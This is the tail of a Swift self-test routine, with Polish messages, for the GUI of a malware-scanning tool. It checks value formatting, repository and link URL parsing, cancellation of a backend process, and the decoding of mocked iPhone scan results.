        check(Fmt.int(15400) == "15\u{a0}400" && Fmt.int(1204) == "1204", "liczby: „\(Fmt.int(15400))”, „\(Fmt.int(1204))”")
        check(Fmt.bytes(1_234_567) == "1,2 MB" && Fmt.bytes(68) == "68 B" && Fmt.bytes(412_008_331_220) == "412 GB",
              "bajty: \(Fmt.bytes(1_234_567)), \(Fmt.bytes(68)), \(Fmt.bytes(412_008_331_220))")
        check(Fmt.duration(12.34) == "12 s" && Fmt.duration(251.4) == "4 min 11 s" && Fmt.duration(14230.8) == "3 h 57 min",
              "czas: \(Fmt.duration(12.34)), \(Fmt.duration(251.4)), \(Fmt.duration(14230.8))")
        check(Fmt.files(1) == "1 plik" && Fmt.files(3) == "3 pliki" && Fmt.files(12) == "12 plików" && Fmt.files(22) == "22 pliki",
              "odmiana: 1 plik, 3 pliki, 12 plików, 22 pliki")
        check(Fmt.filesGenitive(1204) == "1204 plików" && Fmt.filesGenitive(1) == "1 pliku", "dopełniacz: z 1204 plików, z 1 pliku")
        check(Fmt.dateTime("2026-10-06 10:15:00").hasPrefix("6 paź"), "data: \(Fmt.dateTime("2026-10-06 10:15:00"))")
        check(RepoRef.github("psf/requests")?.url == "https://github.com/psf/requests", "GitHub: skrót owner/repo")
        check(RepoRef.github("https://github.com/psf/requests.git")?.name == "requests", "GitHub: .git")
        check(RepoRef.github("github.com/psf/requests/tree/feature/x")?.ref == "feature/x", "GitHub: /tree/ref z ukośnikiem")
        check(RepoRef.github("https://gitlab.com/a/b") == nil && RepoRef.github("nie adres") == nil, "GitHub: odrzuca inne adresy")
        check(RepoRef.huggingFace("https://huggingface.co/datasets/org/zbior")?.kind == .dataset, "HF: datasets")
        check(RepoRef.huggingFace("huggingface.co/spaces/org/demo")?.kind == .space, "HF: spaces")
        check(RepoRef.huggingFace("https://huggingface.co/org/model/blob/main/config.json")?.ref == "main", "HF: blob/ref")
        check(RepoRef.huggingFace("https://github.com/a/b") == nil, "HF: odrzuca GitHub")
        check(LinkRef.parse("example.com/pobierz/a.zip")?.url == "https://example.com/pobierz/a.zip", "link: brak schematu → https")
        check(LinkRef.parse("http://example.com")?.isEncrypted == false, "link: http rozpoznany jako nieszyfrowany")
        check(LinkRef.parse("ftp://example.com/a") == nil && LinkRef.parse("nie link") == nil && LinkRef.parse("https://") == nil,
              "link: odrzuca ftp, tekst, pusty host")

        // ---------------------------------------------------------------- live process + cancel
        print("\n• proces na żywo + anulowanie (SIGINT)")
        let p = BackendProcess(config: config, arguments: ["scan", home + "/Downloads"])
        var events: [BackendEvent] = []
        var stderrLines = 0
        var exitCode: Int32? = nil
        p.onEvents = { events.append(contentsOf: $0) }
        p.onStderr = { stderrLines += $0.count }
        p.onExit = { exitCode = $0 }
        setenv("CERBER_MOCK_SPEED", "2", 1)
        setenv("CERBER_MOCK_SYNTHETIC", "1", 1)
        do {
            try p.start()
            let t0 = Date()
            var interrupted = false
            while exitCode == nil && Date().timeIntervalSince(t0) < 30 {
                RunLoop.main.run(until: Date().addingTimeInterval(0.05))
                if !interrupted, events.contains(where: { if case .progress(let pr) = $0 { return pr.stage == "scan" }; return false }) {
                    interrupted = true
                    p.interrupt()
                }
            }
            check(exitCode == 130, "kod wyjścia 130 po SIGINT (\(exitCode.map(String.init) ?? "brak"))")
            let done = events.compactMap { e -> Summary? in if case .done(let s) = e { return s }; return nil }.first
            check(done?.cancelled == true, "done z cancelled=true i wynikami częściowymi")
            check(stderrLines > 0, "stderr odebrany (\(stderrLines) linii)")
        } catch {
            check(false, "start procesu: \(error.localizedDescription)")
        }
        unsetenv("CERBER_MOCK_SPEED")
        unsetenv("CERBER_MOCK_SYNTHETIC")

        // ---------------------------------------------------------------- iPhone (kabel)
        print("\n• iphone devices / scan / backup")
        r = raw(config, ["iphone", "devices"])
        basic(r, "iphone devices")
        let ipm = IPhoneModel(config: config)
        for e in r.events { ipm.apply(e) }
        check(ipm.listState == .loaded && ipm.info?.devices.first?.readable == true,
              "iphone_devices: podłączony, zaufany iPhone")
        check(ipm.info?.devices.first?.backup?.date == "2026-10-12 21:14" && ipm.info?.backups.count == 1,
              "iphone_devices: ostatnia kopia przypisana do telefonu")
        check((ipm.info?.indicatorsTotal ?? 0) > 0 && ipm.info?.sources.count == 4, "iphone_devices: wskaźniki iOS i źródła")
        r = raw(config, ["iphone", "devices"], env: ["CERBER_MOCK_IPHONE": "none"])
        let ipn = IPhoneModel(config: config)
        for e in r.events { ipn.apply(e) }
        check(ipn.info?.devices.isEmpty == true && ipn.info?.canBackup == nil && (ipn.info?.notes.count ?? 0) >= 2,
              "brak iPhone'a: pusta lista, brak narzędzia do kopii, wskazówki po polsku")
        r = raw(config, ["iphone", "scan", "00008110-001A2B3C4D5E801E", "--make-backup"])
        basic(r, "iphone scan")
        let ips = IPhoneModel(config: config)
        for e in r.events { ips.apply(e) }
        check(ips.visited == ["device", "backup", "sandbox", "analyze", "report"], "iphone scan: etapy \(ips.visited)")
        check(ips.progress["backup"]?.done == 100 && ips.fraction("analyze") == 1, "iphone scan: postęp kopii i analizy")
        check(ips.liveFindings.count == 3, "iphone_finding: 3 znaleziska na żywo")
        if let s = ips.summary {
            check(s.verdict == .malicious && s.findings.first?.severity == .malicious, "iphone_done: werdykt MALICIOUS, najgorsze pierwsze")
            check(s.findings.first?.evidence.first?.contains("free247downloads.com") == true && !(s.findings.first?.advice.isEmpty ?? true),
                  "iphone_done: dowody i porady")
            check(s.checks.count >= 5 && s.lockdownMode == false && s.reportHTML != nil, "iphone_done: lista sprawdzeń, tryb blokady, raport")
        } else { check(false, "iphone_done odebrane") }
        r = raw(config, ["iphone", "backup", "/tmp/kopia"], env: ["CERBER_MOCK_IPHONE": "encrypted"])
        let ipe = IPhoneModel(config: config)
        for e in r.events { ipe.apply(e) }
        check(ipe.summary?.backup?.encrypted == true && ipe.summary?.limitations.first?.contains("zaszyfrowana") == true
              && !ipe.visited.contains("device"), "kopia zaszyfrowana: ograniczenie, bez odczytu z telefonu")
        if case .event(.iphone(let n, let j)) = EventDecoder.decode(line: #"{"ev":"iphone_finding","item":{"title":"x","severity":"weird","evidence":"nie-lista"}}"#) {
            let f = IPhoneFinding(j["item"], index: 0)
            check(n == "iphone_finding" && f.severity == .info && f.evidence.isEmpty, "iphone_finding: nietypowe pola nie psują dekodera")
        } else { check(false, "iphone_finding dekodowane") }

        // ---------------------------------------------------------------- real backend (optional)
        let real = BackendConfig(root: config.root, mock: false)
        if FileManager.default.fileExists(atPath: config.root.appendingPathComponent("cerber/gui_backend.py").path) {
            print("\n• prawdziwy backend (cerber.gui_backend info) – tylko informacyjnie")
            let rr = raw(real, ["info"], mockFast: false)
            let info = rr.events.compactMap { e -> DBInfo? in if case .info(let i) = e { return i }; return nil }.first
            print("    kod \(rr.exitCode), linii \(rr.lines), błędnych \(rr.invalid.count), info: " +
                  (info.map { "\(Fmt.compact($0.patternsTotal)) wzorców, bazy z \(Fmt.shortDate($0.dbBuilt)), brak: \($0.missing)" } ?? "brak"))
        } else {
            print("\n• prawdziwy backend: cerber/gui_backend.py jeszcze nie istnieje – pominięto")
        }

        print("\nWynik: \(passed) OK, \(failures.count) błędów")
        for f in failures { print("  ✗ " + f) }
        return failures.isEmpty
    }
}
